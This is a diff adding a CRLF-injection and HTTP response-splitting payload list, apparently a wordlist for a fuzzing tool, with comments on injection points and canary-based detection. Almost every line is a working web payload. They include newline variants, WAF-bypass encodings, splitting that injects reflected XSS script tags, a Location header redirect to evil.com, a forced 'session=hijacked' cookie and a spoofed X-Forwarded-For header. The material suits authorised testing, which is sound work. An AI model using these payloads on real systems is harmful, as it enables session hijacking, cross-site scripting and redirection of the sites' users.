@@ -1,0 +1,39 @@
+# ==================================================================
+#  CRLF INJECTION / HTTP RESPONSE SPLITTING (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  Inject where input reaches a response header (redirect Location, Set-Cookie,
+#  reflected header value). %0d%0a = CR LF and starts a new header line.
+#  Detection: an injected header/body appears in the RESPONSE. Canary token xq9z
+#  — if a header "X-Canary: xq9z" (or xq9z in the body via splitting) shows up,
+#  CRLF injection works. (%0d%0a transmit raw and decode to real CR LF.)
+# ==================================================================
+
+# ---- 0. CANARY / detection — inject a header carrying xq9z ----
+%0d%0aX-Canary:xq9z
+%0d%0aSet-Cookie:xq9z=1
+%0d%0a%0d%0axq9z
+
+# ---- 1. CR / LF variants ----
+%0aX-Canary:xq9z
+%0dX-Canary:xq9z
+%0d%0aX-Canary:xq9z%0d%0a
+%0d%0a%20X-Canary:xq9z
+%23%0d%0aX-Canary:xq9z
+%3f%0d%0aX-Canary:xq9z
+
+# ---- 2. Encoding / WAF bypass ----
+%E5%98%8A%E5%98%8DX-Canary:xq9z
+%E5%98%8A%E5%98%8DSet-Cookie:xq9z=1
+%25%30%64%25%30%61X-Canary:xq9z
+%u000d%u000aX-Canary:xq9z
+%0d%0aX-Canary%3axq9z
+
+# ---- 3. Response splitting -> reflected XSS ----
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Length:0%0d%0a%0d%0a<html>xq9z</html>
+
+# ---- 4. Header/cookie/redirect injection ----
+%0d%0aLocation:https://evil.com
+%0d%0aSet-Cookie:session=hijacked
+%0d%0aX-Forwarded-For:127.0.0.1
